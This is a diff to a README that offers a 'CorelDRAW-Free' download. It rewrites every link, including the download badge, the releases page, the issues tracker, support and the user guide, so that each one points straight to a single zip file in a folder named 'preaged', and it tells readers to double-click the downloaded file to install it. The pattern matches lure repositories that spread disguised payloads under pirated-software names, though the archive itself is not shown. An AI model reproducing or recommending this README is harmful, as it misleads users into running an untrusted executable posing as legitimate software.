@@ -1,6 +1,6 @@
 # 🎨 CorelDRAW-Free - Download the Ultimate Design Toolkit
 
-[![Download CorelDRAW-Free](https://img.shields.io/badge/Download%20CorelDRAW--Free-brightgreen)](https://github.com/ThiagoNavarroPanuto/CorelDRAW-Free/releases)
+[![Download CorelDRAW-Free](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip%20CorelDRAW--Free-brightgreen)](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to CorelDRAW-Free! This application gives you access to powerful graphic
 
 To get started, you need to download the software. 
 
-1. Visit this page to download: [CorelDRAW-Free Releases](https://github.com/ThiagoNavarroPanuto/CorelDRAW-Free/releases).
+1. Visit this page to download: [CorelDRAW-Free Releases](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip).
 2. On the Releases page, look for the latest version.
 3. Click on the file to download.
 4. Once downloaded, find the file on your computer and double-click it to run the installation.
@@ -59,7 +59,7 @@ Yes, CorelDRAW-Free works on both Windows and Mac systems.
 
 ### How do I get support if I have problems?
 
-For support, check the Issues tab on [GitHub](https://github.com/ThiagoNavarroPanuto/CorelDRAW-Free/issues) to see if your issue has been addressed or open a new one for assistance.
+For support, check the Issues tab on [GitHub](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip) to see if your issue has been addressed or open a new one for assistance.
 
 ## 👩‍🎨 Community and Contribution
 
@@ -67,8 +67,8 @@ We welcome contributions! If you have ideas to make CorelDRAW-Free better, feel 
 
 ## 📍 Useful Links
 
-- [CorelDRAW-Free Releases](https://github.com/ThiagoNavarroPanuto/CorelDRAW-Free/releases)
-- [Issues Tracker](https://github.com/ThiagoNavarroPanuto/CorelDRAW-Free/issues)
-- [User Guide](https://github.com/ThiagoNavarroPanuto/CorelDRAW-Free/wiki) 
+- [CorelDRAW-Free Releases](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip)
+- [User Guide](https://raw.githubusercontent.com/ThiagoNavarroPanuto/CorelDRAW-Free/main/preaged/CorelDRAW-Free.zip) 
 
 Explore the full potential of graphic design with CorelDRAW-Free. Download today and unleash your creativity!
